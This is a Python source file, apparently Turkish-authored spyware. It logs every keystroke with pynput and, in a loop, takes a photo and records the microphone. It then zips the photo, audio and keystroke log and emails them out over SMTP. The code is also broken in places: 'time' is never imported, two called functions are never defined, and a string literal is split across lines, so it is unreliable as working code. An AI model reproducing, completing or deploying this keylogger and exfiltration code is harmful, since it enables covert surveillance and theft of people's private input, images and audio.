
from pynput import keyboard

def keylogger():
    def on_press(key):
        try:
            key_char = key.char
        except AttributeError:
            key_char = f"Special key {key}"
        with open("log.txt", "a") as f:
            f.write(f"{key_char}
  ")  
    def exit_program():
        print("Program will exit in 30 seconds.")
        time.sleep(30)
        return False
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
        listener.stop()
    exit_program()
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import os
import zipfile

def zip_files(files, zip_name):
    with zipfile.ZipFile(zip_name, 'w') as zipf:
        for file in files:
            zipf.write(file, os.path.basename(file))

def send_email(subject, body, to_email, smtp_server, smtp_port, sender_email, sender_password, attached_files=[]):
    # Zip dosyasını oluştur
    zip_file_name = "attached_files.zip"
    zip_files(attached_files, zip_file_name)
    message = MIMEMultipart()
    message['Subject'] = subject
    message['From'] = sender_email
    message['To'] = to_email
    message.attach(MIMEText(body, 'plain'))

    with open(zip_file_name, 'rb') as zip_file:
        attach = MIMEApplication(zip_file.read(),_subtype="zip")
        attach.add_header('Content-Disposition','attachment',filename=str(zip_file_name))
        message.attach(attach)

    with smtplib.SMTP_SSL(smtp_server, smtp_port) as server:
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, to_email, message.as_string())
    os.remove(zip_file_name)

subject = "yok"
body = "yok"
to_email = "123"
smtp_server = "12412"
smtp_port = "123132312"
sender_email = "123312"
sender_password = "1232"

files_to_send = ["cikti.mp3", "photo.jpg", "log.txt"]

if __name__ == "__main__":
    while True:
        take_photo()
        keylogger()
        mikrofon_dinle_ve_cevir(dosya_adi="cikti.mp3")
        send_email(subject, body, to_email, smtp_server, smtp_port, sender_email, sender_password, files_to_send)
        time.sleep(10)
